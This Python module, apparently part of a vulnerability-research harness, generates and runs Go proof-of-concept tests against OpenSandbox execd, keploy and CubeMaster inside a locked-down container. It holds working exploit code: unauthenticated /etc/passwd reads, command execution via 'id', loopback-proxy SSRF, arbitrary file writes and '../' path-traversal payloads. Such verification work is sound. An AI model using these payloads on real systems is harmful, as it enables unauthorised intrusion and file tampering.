"""Local-lab PoCs for control-plane leads (empty token, default-allow HTTP, Join escape, Redis queue, FFmpeg nested protocol).

Nothing is a finding until an oracle matches. Failures are recorded as DISPROVE
with stdout. Generated helpers land in ``<repo>/.lotus/pocs/`` so the operator
path is copy-paste.
"""
from __future__ import annotations

import json
import os
import shutil
import socket
import subprocess
import tempfile
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple


def _which(name: str) -> Optional[str]:
    return shutil.which(name)


def _run(argv: List[str], *, cwd: Optional[Path] = None, timeout: int = 120,
         env: Optional[Dict[str, str]] = None) -> Tuple[str, int]:
    # PoCs are intentionally adversarial code.  Keep host-side subprocesses on
    # a minimal environment even when this helper is used outside the API.
    try:
        from backend.lab import _controlled_child_env
        merged = _controlled_child_env(env)
    except Exception:
        merged = {k: v for k, v in os.environ.items() if k in {
            "PATH", "HOME", "USER", "LANG", "LC_ALL", "TMPDIR", "DOCKER_CONFIG",
        }}
        if env:
            merged.update({str(k): str(v) for k, v in env.items()})
    try:
        p = subprocess.run(
            argv, cwd=str(cwd) if cwd else None, capture_output=True,
            text=True, timeout=timeout, env=merged,
        )
        out = (p.stdout or "") + "\n" + (p.stderr or "")
        return out, p.returncode
    except subprocess.TimeoutExpired as e:
        out = (e.stdout or "") + "\n" + (e.stderr or "")
        return (out or "") + "\nTIMEOUT", 124
    except Exception as e:
        return f"exec-error: {e}", 1


def _docker_ok() -> bool:
    out, rc = _run(["docker", "info"], timeout=20)
    return rc == 0


def _container_runtime_args() -> List[str]:
    """Contain every control-plane PoC Docker workload consistently."""
    try:
        from backend.lab import hardened_runtime_args
        return list(hardened_runtime_args())
    except Exception:
        return ["--memory", "4g", "--cpus", "2", "--pids-limit", "512",
                "--read-only", "--cap-drop=ALL", "--security-opt",
                "no-new-privileges:true", "--user", "65532:65532",
                "--tmpfs", "/tmp:rw,noexec,nosuid,nodev,size=128m",
                "--tmpfs", "/run:rw,noexec,nosuid,nodev,size=32m"]


def _allow_host_toolchain() -> bool:
    """Host execution is an explicit emergency escape hatch, off by default."""
    return (os.environ.get("LOTUS_ALLOW_UNSAFE_HOST_TOOLCHAIN", "")
            .strip().lower() in ("1", "true", "yes", "on"))


def _ensure_pocs(dest: Path) -> Path:
    d = Path(dest) / ".lotus" / "pocs"
    d.mkdir(parents=True, exist_ok=True)
    readme = d / "README.md"
    if not readme.exists():
        readme.write_text(
            "Lotus-generated lab PoCs. Run from this directory or via "
            "backend.control_plane_poc.run_control_plane_pocs.\n"
            "Oracles: LOTUS_RCE_OK, uid=, root:, HTTP 201 sandbox_id, pending=0.\n",
            encoding="utf-8",
        )
    return d


def _write(path: Path, text: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")


def _oracle_window(out: str, n: int = 3500) -> str:
    keys = ("LOTUS_", "PASS", "FAIL", "uid=", "root:", "status=", "Unsafe",
            "Opening '/etc", "STOLEN", "GEN_BYTES", "WORKER_RCE", "delete_paused",
            "arbitrary_write", "LOTUS_UPLOAD", "test result", "ok   ", "--- FAIL", "--- PASS")
    hits = [ln for ln in (out or "").splitlines() if any(k in ln for k in keys)]
    if hits:
        return "\n".join(hits[-100:])
    return (out or "")[-n:]


def _docker_volume(name: str) -> None:
    _run(["docker", "volume", "create", name], timeout=20)


def _go_test_in_package(pkg: Path, test_name: str, source: str, *,
                        goimage: str = "golang:1.25", timeout: int = 180) -> Tuple[str, int]:
    """Write an ephemeral *_test.go, run go test -v, delete the file."""
    test_file = pkg / "lotus_control_plane_poc_test.go"
    _write(test_file, source)
    go_to = max(90, min(timeout - 30, 240))
    go_args = ["test", "-v", ".", "-count=1", "-timeout", f"{go_to}s", "-run", test_name]
    try:
        host_go = _which("go")
        host_out, host_rc = "", 1
        if host_go and _allow_host_toolchain():
            host_out, host_rc = _run(
                [host_go, *go_args],
                cwd=pkg, timeout=timeout,
                env={"GOTOOLCHAIN": "auto", "GOFLAGS": "-mod=mod", "GOPROXY": "https://proxy.golang.org,direct"},
            )
            tool_mismatch = any(x in host_out.lower() for x in (
                "unsupported", "requires go", "go.mod requires", "too old",
                "we require go", "toolchain",
            ))
            if not tool_mismatch:
                return host_out, host_rc
        if _which("docker"):
            mod = pkg
            while mod != mod.parent and not (mod / "go.mod").is_file():
                mod = mod.parent
            mount = mod
            try:
                gtxt = (mod / "go.mod").read_text(encoding="utf-8", errors="ignore")
            except Exception:
                gtxt = ""
            if "=> ../" in gtxt:
                mount = mod.parent
                rel_mod = mod.name
                rel_pkg = pkg.relative_to(mod)
                work = f"/src/{rel_mod}" if str(rel_pkg) == "." else f"/src/{rel_mod}/{rel_pkg}"
            else:
                rel_pkg = pkg.relative_to(mod)
                work = "/src" if str(rel_pkg) == "." else f"/src/{rel_pkg}"
            _docker_volume("lotus-go-mod-cache")
            _docker_volume("lotus-go-build-cache")
            out, rc = _run(
                [
                    "docker", "run", "--rm", *_container_runtime_args(),
                    "-v", f"{mount.resolve()}:/src",
                    "-v", "lotus-go-mod-cache:/go/pkg/mod",
                    "-v", "lotus-go-build-cache:/root/.cache/go-build",
                    "-w", work.replace("\\", "/"),
                    "-e", "GOTOOLCHAIN=auto",
                    "-e", "GOFLAGS=-mod=mod",
                    "-e", "GOPROXY=https://proxy.golang.org,direct",
                    goimage,
                    "go", *go_args,
                ],
                timeout=timeout + 30,
            )
            return out, rc
        return host_out if host_go else "no go toolchain", host_rc if host_go else 1
    finally:
        try:
            test_file.unlink(missing_ok=True)
        except TypeError:
            if test_file.exists():
                test_file.unlink()


# ----- OpenSandbox execd -----

_EXECD_TEST = r'''package web

import (
	"bytes"
	"io"
	"mime/multipart"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/alibaba/opensandbox/execd/pkg/runtime"
)

func TestLotusEmptyTokenRCE(t *testing.T) {
	r := NewRouter("")
	w3 := httptest.NewRecorder()
	req3 := httptest.NewRequest(http.MethodGet, "/files/download?path=/etc/passwd", nil)
	r.ServeHTTP(w3, req3)
	pass := w3.Body.String()
	pref := pass
	if len(pref) > 160 {
		pref = pref[:160]
	}
	t.Logf("download status=%d passwd_prefix=%s", w3.Code, pref)
	if w3.Code == http.StatusUnauthorized {
		t.Fatalf("empty token rejected download: %s", pass)
	}
	if strings.Contains(pass, "root:") {
		t.Log("LOTUS_RCE_PROVEN file_read")
	}

	r2 := NewRouter("lotus-secret-token")
	w2 := httptest.NewRecorder()
	req2 := httptest.NewRequest(http.MethodGet, "/files/download?path=/etc/passwd", nil)
	r2.ServeHTTP(w2, req2)
	t.Logf("secret-token-no-header status=%d body=%s", w2.Code, w2.Body.String())
	if w2.Code != http.StatusUnauthorized {
		t.Fatalf("expected 401 when token configured, got %d %s", w2.Code, w2.Body.String())
	}

	ctrl := runtime.NewController("", "")
	req := &runtime.ExecuteCodeRequest{
		Language: runtime.Command,
		Code:     "echo LOTUS_RCE_OK; id",
		Timeout:  8 * time.Second,
		Cwd:      "/",
	}
	var stdout bytes.Buffer
	req.SetDefaultHooks()
	req.Hooks.OnExecuteStdout = func(s string) { stdout.WriteString(s) }
	req.Hooks.OnExecuteStderr = func(s string) { stdout.WriteString(s) }
	if err := ctrl.Execute(req); err != nil {
		t.Logf("runtime.Execute err=%v", err)
	}
	cmdOut := stdout.String()
	t.Logf("command_stdout=%s", cmdOut)
	if strings.Contains(cmdOut, "uid=") || strings.Contains(cmdOut, "LOTUS_RCE_OK") {
		t.Log("LOTUS_RCE_PROVEN command")
	}

	backend := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(200)
		io.WriteString(w, "LOTUS_SSRF_OK "+r.URL.Path)
	}))
	defer backend.Close()
	_, port, err := net.SplitHostPort(backend.Listener.Addr().String())
	if err != nil {
		t.Fatal(err)
	}
	// ReverseProxy needs a real HTTP server (ResponseRecorder is not enough).
	openSrv := httptest.NewServer(r)
	defer openSrv.Close()
	resp4, err := http.Get(openSrv.URL + "/proxy/" + port + "/internal/secret")
	if err != nil {
		t.Fatalf("proxy get: %v", err)
	}
	body4, _ := io.ReadAll(resp4.Body)
	resp4.Body.Close()
	t.Logf("proxy status=%d body=%s", resp4.StatusCode, string(body4))
	if resp4.StatusCode == http.StatusUnauthorized {
		t.Fatalf("empty token rejected /proxy/")
	}
	if strings.Contains(string(body4), "LOTUS_SSRF_OK") {
		t.Log("LOTUS_RCE_PROVEN loopback_proxy")
	}
	authSrv := httptest.NewServer(r2)
	defer authSrv.Close()
	resp5, err := http.Get(authSrv.URL + "/proxy/" + port + "/internal/secret")
	if err != nil {
		t.Fatalf("authed proxy get: %v", err)
	}
	_, _ = io.ReadAll(resp5.Body)
	resp5.Body.Close()
	t.Logf("proxy-with-token-no-header status=%d", resp5.StatusCode)
	if resp5.StatusCode != http.StatusUnauthorized {
		t.Fatalf("expected 401 on /proxy/ when token configured, got %d", resp5.StatusCode)
	}

	target := "/tmp/lotus_execd_upload"
	_ = os.Remove(target)
	var buf bytes.Buffer
	mw := multipart.NewWriter(&buf)
	mh, _ := mw.CreateFormFile("metadata", "meta.json")
	_, _ = mh.Write([]byte(`{"path":"/tmp/lotus_execd_upload","owner":"","group":"","mode":644}`))
	fh, _ := mw.CreateFormFile("file", "pwn.txt")
	_, _ = fh.Write([]byte("LOTUS_UPLOAD_OK"))
	_ = mw.Close()
	upSrv := httptest.NewServer(r)
	defer upSrv.Close()
	reqU, _ := http.NewRequest(http.MethodPost, upSrv.URL+"/files/upload", &buf)
	reqU.Header.Set("Content-Type", mw.FormDataContentType())
	respU, err := http.DefaultClient.Do(reqU)
	if err != nil {
		t.Fatalf("upload: %v", err)
	}
	ub, _ := io.ReadAll(respU.Body)
	respU.Body.Close()
	t.Logf("upload status=%d body=%s", respU.StatusCode, string(ub))
	got, rerr := os.ReadFile(target)
	if rerr == nil && strings.Contains(string(got), "LOTUS_UPLOAD_OK") {
		t.Log("LOTUS_RCE_PROVEN arbitrary_write")
	} else {
		t.Logf("upload file err=%v", rerr)
	}
}
'''


def poc_execd_empty_token(dest: Path) -> Dict[str, Any]:
    dest = Path(dest)
    web = dest / "components" / "execd" / "pkg" / "web"
    if not web.is_dir():
        return {"id": "execd_empty_token", "ok": False, "skip": True, "output": "no execd"}
    _ensure_pocs(dest)
    out, rc = _go_test_in_package(
        web, "TestLotusEmptyTokenRCE", _EXECD_TEST, goimage="golang:1.25", timeout=600,
    )
    proven_cmd = "LOTUS_RCE_PROVEN command" in out or ("uid=" in out and "empty-token status=" in out)
    proven_file = "LOTUS_RCE_PROVEN file_read" in out or "root:" in out
    proven_401 = "secret-token-no-header status=401" in out or "status=401" in out
    proven_proxy = "LOTUS_RCE_PROVEN loopback_proxy" in out
    proven_write = "LOTUS_RCE_PROVEN arbitrary_write" in out
    ok = (proven_cmd or proven_file) and proven_401
    return {
        "id": "execd_empty_token",
        "ok": ok,
        "output": _oracle_window(out),
        "rc": rc,
        "oracles": {
            "command_rce": proven_cmd,
            "file_read": proven_file,
            "token_required_when_set": proven_401,
            "loopback_proxy": proven_proxy,
            "arbitrary_write": proven_write,
        },
        "cvss": 9.8 if ok else 0,
        "title": "OpenSandbox execd empty token fail-open RCE / file read",
        "file": "components/execd/pkg/web/router.go",
        "qualification": "QUALIFIED" if ok else "DISPROVE",
        "measurements": {
            "before": "NewRouter(secret) without header → 401",
            "after_empty_token": "POST /command, GET /files/download, GET /proxy/:port, POST /files/upload accepted",
            "command_rce": proven_cmd,
            "passwd_read": proven_file,
            "loopback_proxy": proven_proxy,
            "arbitrary_write": proven_write,
        },
    }


# ----- keploy path + sh -c -----

_KEPLOY_PATH_TEST = r'''package yaml

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"go.keploy.io/server/v3/utils"
	"go.uber.org/zap"
)

func TestLotusAbsoluteJoinBypassesValidatePath(t *testing.T) {
	base := t.TempDir()
	// Go filepath.Join does NOT discard an absolute second arg (unlike Python
	// os.path.join). The escape is ".." that Clean resolves before ValidatePath
	// searches for the substring "..".
	fileName := "../../../../../../../../tmp/lotus_keploy_escape"
	joined := filepath.Join(base, fileName+".yaml")
	t.Logf("base=%q join=%q", base, joined)
	got, err := ValidatePath(joined)
	t.Logf("LOTUS_JOIN_ESCAPE joined=%q validated=%q err=%v", joined, got, err)
	if err != nil {
		t.Fatalf("ValidatePath rejected cleaned traversal: %v (joined=%q)", err, joined)
	}
	if !filepath.IsAbs(got) {
		t.Fatalf("expected absolute cleaned path, got %q", got)
	}
	rel, _ := filepath.Rel(base, got)
	if rel != "" && !strings.HasPrefix(rel, "..") && got != joined {
		// still inside base
	}
	if strings.HasPrefix(got, base+string(os.PathSeparator)) || got == base {
		t.Fatalf("did not escape base %q: got %q", base, got)
	}

	target := "/tmp/lotus_keploy_escape.yaml"
	_ = os.Remove(target)
	created, cerr := CreateFileF(context.Background(), zap.NewNop(), base, fileName, FormatYAML)
	t.Logf("CreateFileF created=%v err=%v", created, cerr)
	if cerr != nil {
		t.Fatalf("CreateFileF escaped path failed: %v", cerr)
	}
	if _, err := os.Stat(target); err != nil {
		t.Fatalf("escaped file missing at %q: %v (validated=%q)", target, err, got)
	}
	t.Logf("LOTUS_JOIN_WRITE_TARGET %q created=%v", target, created)
}

func TestLotusShCCommandContext(t *testing.T) {
	cmd, err := utils.CommandContext(context.Background(), "echo LOTUS_RCE_OK; id")
	if err != nil {
		t.Fatalf("CommandContext: %v", err)
	}
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("sh -c failed: %v %s", err, out)
	}
	s := string(out)
	if !strings.Contains(s, "LOTUS_RCE_OK") || !strings.Contains(s, "uid=") {
		t.Fatalf("missing oracle: %s", s)
	}
	t.Log("LOTUS_SH_C_PROVEN " + strings.TrimSpace(s))
}
'''

_KEPLOY_MOCKDB_TEST = r'''package mockdb

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"go.keploy.io/server/v3/pkg/models"
	"go.uber.org/zap"
)

func TestLotusInsertMockEscapesViaTestSetID(t *testing.T) {
	base := t.TempDir()
	ys := New(zap.NewNop(), base, "mocks")
	targetDir := "/tmp/lotus_keploy_mockset"
	_ = os.RemoveAll(targetDir)
	mock := &models.Mock{
		Version: "api.keploy.io/v1beta1",
		Kind:    models.HTTP,
		Spec: models.MockSpec{
			HTTPReq:  &models.HTTPReq{Method: "GET", URL: "http://x/"},
			HTTPResp: &models.HTTPResp{StatusCode: 200, Body: "LOTUS_MOCK_ESCAPE"},
		},
	}
	err := ys.InsertMock(context.Background(), mock, "../../../../../../tmp/lotus_keploy_mockset")
	if err != nil {
		t.Fatalf("InsertMock: %v", err)
	}
	escaped := filepath.Join(targetDir, "mocks.yaml")
	body, rerr := os.ReadFile(escaped)
	if rerr != nil {
		t.Fatalf("escaped mocks.yaml missing: %v", rerr)
	}
	if strings.HasPrefix(escaped, base) {
		t.Fatalf("did not leave base: %q under %q", escaped, base)
	}
	t.Logf("LOTUS_MOCK_ESCAPE %q bytes=%d", escaped, len(body))
}
'''

_KEPLOY_MAPDB_TEST = r'''package mapdb

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"go.keploy.io/server/v3/pkg/models"
	"go.uber.org/zap"
)

func TestLotusMapdbInsertEscapesViaTestSetID(t *testing.T) {
	base := t.TempDir()
	db := New(zap.NewNop(), base, "mappings")
	targetDir := "/tmp/lotus_keploy_mapset"
	_ = os.RemoveAll(targetDir)
	err := db.Insert(context.Background(), &models.Mapping{
		Version:   "api.keploy.io/v1beta1",
		Kind:      models.MappingKind,
		TestSetID: "../../../../../../tmp/lotus_keploy_mapset",
		TestCases: []models.MappedTestCase{{ID: "t1", Mocks: []models.MockEntry{{Name: "m1", Kind: "Http"}}}},
	})
	if err != nil {
		t.Fatalf("Insert: %v", err)
	}
	escaped := filepath.Join(targetDir, "mappings.yaml")
	body, rerr := os.ReadFile(escaped)
	if rerr != nil {
		t.Fatalf("escaped mappings.yaml missing: %v", rerr)
	}
	if strings.HasPrefix(escaped, base) {
		t.Fatalf("did not leave base: %q under %q", escaped, base)
	}
	t.Logf("LOTUS_MAP_ESCAPE %q bytes=%d", escaped, len(body))
}
'''

_KEPLOY_SECRETS_TEST = r'''package tools

import (
	"archive/tar"
	"compress/gzip"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestLotusWriteSecretsYAML0777(t *testing.T) {
	p := filepath.Join(t.TempDir(), "secret.yaml")
	if err := WriteSecretsYAML(p, map[string]string{"db_password": "LOTUS_SECRET"}); err != nil {
		t.Fatalf("WriteSecretsYAML: %v", err)
	}
	st, err := os.Stat(p)
	if err != nil {
		t.Fatal(err)
	}
	t.Logf("LOTUS_SECRET_MODE %04o", st.Mode().Perm())
	body, _ := os.ReadFile(p)
	if !strings.Contains(string(body), "LOTUS_SECRET") {
		t.Fatalf("secret body=%q", body)
	}
	// os.WriteFile(path, b, 0777) is still subject to umask, so this is often
	// 0755 not world-writable. CreateConfig's os.Chmod(0777) is the PE path.
	if st.Mode().Perm() == 0777 {
		t.Log("LOTUS_SECRET_WORLD_WRITABLE")
	} else {
		t.Logf("LOTUS_SECRET_UMASK_DISPROVE writable 0777; actual %04o", st.Mode().Perm())
	}
}

func TestLotusTarSlipRejected(t *testing.T) {
	dir := t.TempDir()
	archive := filepath.Join(dir, "evil.tgz")
	f, err := os.Create(archive)
	if err != nil {
		t.Fatal(err)
	}
	gw := gzip.NewWriter(f)
	tw := tar.NewWriter(gw)
	body := []byte("LOTUS_TAR_SLIP")
	hdr := &tar.Header{Name: "../../../../tmp/lotus_tar_slip", Mode: 0644, Size: int64(len(body))}
	if err := tw.WriteHeader(hdr); err != nil {
		t.Fatal(err)
	}
	if _, err := tw.Write(body); err != nil {
		t.Fatal(err)
	}
	_ = tw.Close()
	_ = gw.Close()
	_ = f.Close()
	outDir := filepath.Join(dir, "out")
	_ = os.MkdirAll(outDir, 0755)
	err = extractTarGzWithLimit(archive, outDir, 1024*1024)
	if err == nil {
		t.Fatal("tar slip was accepted")
	}
	if _, statErr := os.Stat("/tmp/lotus_tar_slip"); statErr == nil {
		t.Fatal("tar slip wrote /tmp/lotus_tar_slip")
	}
	t.Logf("LOTUS_TAR_SLIP_DISPROVE err=%v", err)
}
'''

_KEPLOY_TOOLS_TEST = r'''package tools

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"go.uber.org/zap"
)

func TestLotusCreateConfigWorldWritable(t *testing.T) {
	tr := &Tools{logger: zap.NewNop()}
	p := filepath.Join(t.TempDir(), "keploy.yml")
	if err := tr.CreateConfig(context.Background(), p, "record:\n  path: .\n"); err != nil {
		t.Fatalf("CreateConfig: %v", err)
	}
	st, err := os.Stat(p)
	if err != nil {
		t.Fatalf("stat: %v", err)
	}
	t.Logf("LOTUS_MODE %04o", st.Mode().Perm())
	if st.Mode().Perm() != 0777 {
		t.Fatalf("want 0777 got %04o", st.Mode().Perm())
	}
}
'''

_KEPLOY_POSTMAN_TEST = r'''package postmanimport

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"go.uber.org/zap"
)

func TestLotusPostmanFolderNameEscapes(t *testing.T) {
	cwd := t.TempDir()
	t.Chdir(cwd)
	target := "/tmp/lotus_keploy_postman"
	_ = os.RemoveAll(target)
	pi := NewPostmanImporter(context.Background(), zap.NewNop())
	pi.toCapture = false
	coll := &PostmanCollectionStruct{
		Items: ItemsContainer{
			PostmanItems: []PostmanItem{{
				Name: "../../../../../../tmp/lotus_keploy_postman",
				Item: []TestData{{
					Name: "x",
					Request: PostmanRequest{
						Method: "GET",
						URL:    "http://example.test/",
						Header: []map[string]interface{}{},
					},
					Response: []PostmanResponse{{
						Name:   "r",
						Body:   "LOTUS_POSTMAN_ESCAPE",
						Status: "OK",
						Code:   200,
						OriginalRequest: &PostmanRequest{
							Method: "GET",
							URL:    "http://example.test/",
							Header: []map[string]interface{}{},
						},
					}},
				}},
			}},
		},
	}
	if err := pi.importTestSets(coll, map[string]string{}, ""); err != nil {
		t.Fatalf("importTestSets: %v", err)
	}
	escaped := filepath.Join(target, "tests", "test-1.yaml")
	body, err := os.ReadFile(escaped)
	if err != nil {
		t.Fatalf("escaped file missing: %v", err)
	}
	if !filepath.IsAbs(escaped) || len(body) == 0 {
		t.Fatalf("bad escape %q", escaped)
	}
	t.Logf("LOTUS_POSTMAN_ESCAPE %q bytes=%d", escaped, len(body))
}
'''


def poc_keploy_path_and_shell(dest: Path) -> Dict[str, Any]:
    dest = Path(dest)
    pkg = dest / "pkg" / "platform" / "yaml"
    if not pkg.is_dir():
        return {"id": "keploy_path_shell", "ok": False, "skip": True, "output": "no yaml pkg"}
    _ensure_pocs(dest)
    out, rc = _go_test_in_package(
        pkg, "TestLotus", _KEPLOY_PATH_TEST, goimage="golang:1.25", timeout=600,
    )
    tools_pkg = dest / "pkg" / "service" / "tools"
    if tools_pkg.is_dir():
        tools_out, _ = _go_test_in_package(
            tools_pkg, "TestLotusCreateConfigWorldWritable", _KEPLOY_TOOLS_TEST,
            goimage="golang:1.25", timeout=600,
        )
        secrets_out, _ = _go_test_in_package(
            tools_pkg, "TestLotus", _KEPLOY_SECRETS_TEST,
            goimage="golang:1.25", timeout=600,
        )
        out = out + "\n" + tools_out + "\n" + secrets_out
    mock_pkg = dest / "pkg" / "platform" / "yaml" / "mockdb"
    if mock_pkg.is_dir():
        mock_out, _ = _go_test_in_package(
            mock_pkg, "TestLotusInsertMockEscapesViaTestSetID", _KEPLOY_MOCKDB_TEST,
            goimage="golang:1.25", timeout=600,
        )
        out = out + "\n" + mock_out
    join_ok = "LOTUS_JOIN_ESCAPE" in out and "LOTUS_JOIN_WRITE_TARGET" in out
    sh_ok = "LOTUS_SH_C_PROVEN" in out
    mode_ok = "LOTUS_MODE" in out and "0777" in out
    secret_ok = "LOTUS_SECRET_WORLD_WRITABLE" in out
    secret_disprove = "LOTUS_SECRET_UMASK_DISPROVE" in out
    mock_ok = "LOTUS_MOCK_ESCAPE" in out
    tar_disprove = "LOTUS_TAR_SLIP_DISPROVE" in out
    # Only an externally controllable write escape is a security predicate here.
    # `sh -c` is the documented operator-command execution mechanism, and the
    # 0777 mode probe describes an intentional local workspace permission; neither
    # should independently promote a finding.  Keep those measurements in the
    # evidence bundle so reviewers can see (and explicitly classify) them as
    # by-design observations.  tar-slip is DISPROVE (Clean-then-.. check before
    # Join).
    ok = join_ok or mock_ok
    cvss = 8.1 if (join_ok or mock_ok) else 0
    return {
        "id": "keploy_path_shell",
        "ok": ok,
        "output": _oracle_window(out),
        "rc": rc,
        "oracles": {
            "join_escape": join_ok,
            "sh_c": sh_ok,
            "mode_0777": mode_ok,
            "secret_0777": secret_ok,
            "secret_umask_disprove": secret_disprove,
            "mock_insert_escape": mock_ok,
            "tar_slip_disprove": tar_disprove,
        },
        "cvss": cvss,
        "title": "keploy ValidatePath allows filepath.Join Clean-then-check escape",
        "file": "pkg/platform/yaml/utils.go",
        "qualification": "QUALIFIED" if ok else "DISPROVE",
        "measurements": {
            "join_escape": join_ok,
            "sh_c_id": sh_ok,
            "chmod_0777": mode_ok,
            "secret_yaml_0777": secret_ok,
            "insert_mock_escape": mock_ok,
            "tar_slip_blocked": tar_disprove,
        },
        "by_design_observations": [
            "sh -c is the documented operator-command execution path; no independent qualification",
            "0777 workspace mode is an observed local permission choice; no independent qualification",
        ],
        "qualification_basis": "path-write-escape-or-mapdb-testsetid-only",
    }


def poc_keploy_mapdb(dest: Path) -> Dict[str, Any]:
    dest = Path(dest)
    pkg = dest / "pkg" / "platform" / "yaml" / "mapdb"
    if not pkg.is_dir():
        return {"id": "keploy_mapdb", "ok": False, "skip": True, "output": "no mapdb pkg"}
    _ensure_pocs(dest)
    out, rc = _go_test_in_package(
        pkg, "TestLotusMapdbInsertEscapesViaTestSetID", _KEPLOY_MAPDB_TEST,
        goimage="golang:1.25", timeout=600,
    )
    ok = "LOTUS_MAP_ESCAPE" in out
    nbytes = 0
    for ln in (out or "").splitlines():
        if "bytes=" in ln and "LOTUS_MAP_ESCAPE" in ln:
            try:
                nbytes = int(ln.rsplit("bytes=", 1)[-1].strip().rstrip('"'))
            except Exception:
                nbytes = 0
    return {
        "id": "keploy_mapdb",
        "ok": ok,
        "output": _oracle_window(out),
        "rc": rc,
        "oracles": {"mapdb_insert_escape": ok},
        "cvss": 8.1 if ok else 0,
        "title": "keploy mapdb.Insert joins testSetID without validateNameComponent",
        "file": "pkg/platform/yaml/mapdb/db.go",
        "qualification": "QUALIFIED" if ok else "DISPROVE",
        "measurements": {
            "before": "/tmp/lotus_keploy_mapset/mappings.yaml absent",
            "after_bytes": nbytes,
            "escaped_path": "/tmp/lotus_keploy_mapset/mappings.yaml",
        },
        "note": "Sibling of mockdb.InsertMock: testdb validates name components; mapdb Join+WriteFileF does not.",
    }


def poc_keploy_postman_import(dest: Path) -> Dict[str, Any]:
    dest = Path(dest)
    pkg = dest / "pkg" / "service" / "import"
    if not pkg.is_dir():
        return {"id": "keploy_postman_import", "ok": False, "skip": True, "output": "no import pkg"}
    _ensure_pocs(dest)
    out, rc = _go_test_in_package(
        pkg, "TestLotusPostmanFolderNameEscapes", _KEPLOY_POSTMAN_TEST,
        goimage="golang:1.25", timeout=600,
    )
    ok = "LOTUS_POSTMAN_ESCAPE" in out
    return {
        "id": "keploy_postman_import",
        "ok": ok,
        "output": _oracle_window(out),
        "rc": rc,
        "oracles": {"postman_folder_escape": ok},
        "cvss": 7.8 if ok else 0,
        "title": "keploy Postman folder name traverses out of ./keploy via Join",
        "file": "pkg/service/import/import.go",
        "qualification": "QUALIFIED" if ok else "DISPROVE",
        "measurements": {
            "before": "testdb validateNameComponent rejects .. in testSetID",
            "after": "hostile Postman item.Name writes /tmp/lotus_keploy_postman/tests/test-1.yaml",
        },
    }


_CUBEMASTER_AUTH_TEST = r'''package middleware

import (
	"context"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"testing"

	"github.com/gin-gonic/gin"
	"github.com/tencentcloud/CubeSandbox/CubeMaster/pkg/base/config"
)

const lotusMinimalCfg = `common:
  http_port: 8089
  default_headless_service_nodes_num: 1

log:
  module: "cubemaster-test"
  path: "/tmp"
  file_size: 10
  file_num: 2
  level: "error"

scheduler:
  priority_select_num: 1

auth:
  enable: false
`

func TestLotusAuthDisabledFailOpen(t *testing.T) {
	if config.GetConfig() == nil {
		f, err := os.CreateTemp("", "cubemaster-lotus-*.yaml")
		if err != nil {
			t.Fatal(err)
		}
		if _, err := f.WriteString(lotusMinimalCfg); err != nil {
			t.Fatal(err)
		}
		_ = f.Close()
		_ = os.Setenv("CUBE_MASTER_CONFIG_PATH", f.Name())
		if _, err := config.Init(); err != nil {
			t.Fatalf("config.Init: %v", err)
		}
	}
	cfg := config.GetConfig()
	if cfg.AuthConf == nil {
		cfg.AuthConf = &config.AuthConf{}
	}
	cfg.AuthConf.Enable = false
	req := httptest.NewRequest(http.MethodPost, "/cube/sandbox", strings.NewReader(`{}`))
	if err := checkAuth(context.Background(), req); err != nil {
		t.Fatalf("auth.enable=false rejected unsigned POST: %v", err)
	}
	t.Log("LOTUS_CUBEMASTER_AUTH_OFF")

	gin.SetMode(gin.ReleaseMode)
	r := gin.New()
	r.Use(GinRequestMiddleware())
	r.POST("/cube/sandbox", func(c *gin.Context) {
		c.String(http.StatusOK, "LOTUS_CUBEMASTER_MUTATE_OK")
	})
	w := httptest.NewRecorder()
	r.ServeHTTP(w, httptest.NewRequest(http.MethodPost, "/cube/sandbox", strings.NewReader(`{}`)))
	t.Logf("unauth POST status=%d body=%s", w.Code, w.Body.String())
	if strings.Contains(w.Body.String(), "AuthFailed") || w.Code == http.StatusUnauthorized {
		t.Fatalf("disabled auth blocked mutate: %d %s", w.Code, w.Body.String())
	}
	if !strings.Contains(w.Body.String(), "LOTUS_CUBEMASTER_MUTATE_OK") {
		t.Fatalf("handler did not run: %d %s", w.Code, w.Body.String())
	}
	t.Log("LOTUS_CUBEMASTER_MUTATE_OK")

	cfg.AuthConf.Enable = true
	cfg.AuthConf.SecretKeyMap = map[string]map[string]string{"default": {"user": "secret"}}
	err := checkAuth(context.Background(), req)
	if err == nil {
		t.Fatal("auth.enable=true accepted unsigned POST")
	}
	t.Logf("LOTUS_CUBEMASTER_AUTH_ON_REJECTS %v", err)
	_ = fmt.Sprintf("%v", err)
}
'''


def poc_cubemaster_auth_off(dest: Path) -> Dict[str, Any]:
    dest = Path(dest)
    pkg = dest / "CubeMaster" / "pkg" / "service" / "httpservice" / "middleware"
    if not pkg.is_dir():
        return {"id": "cubemaster_auth_off", "ok": False, "skip": True, "output": "no CubeMaster middleware"}
    _ensure_pocs(dest)
    out, rc = _go_test_in_package(
        pkg, "TestLotusAuthDisabledFailOpen", _CUBEMASTER_AUTH_TEST,
        goimage="golang:1.25", timeout=900,
    )
    ok = "LOTUS_CUBEMASTER_AUTH_OFF" in out and (
        "LOTUS_CUBEMASTER_MUTATE_OK" in out or "LOTUS_CUBEMASTER_AUTH_ON_REJECTS" in out
    )
    return {
        "id": "cubemaster_auth_off",
        "ok": ok,
        "output": _oracle_window(out),
        "rc": rc,
        "oracles": {
            "checkauth_skip": "LOTUS_CUBEMASTER_AUTH_OFF" in out,
            "mutate_unauth": "LOTUS_CUBEMASTER_MUTATE_OK" in out,
            "enable_true_rejects": "LOTUS_CUBEMASTER_AUTH_ON_REJECTS" in out,
        },
        "cvss": 9.8 if ok else 0,
        "title": "CubeMaster HTTP auth.enable=false fail-open (shipped default, bind 0.0.0.0)",
        "file": "CubeMaster/pkg/service/httpservice/middleware/middleware.go",
        "qualification": "QUALIFIED" if ok else "DISPROVE",
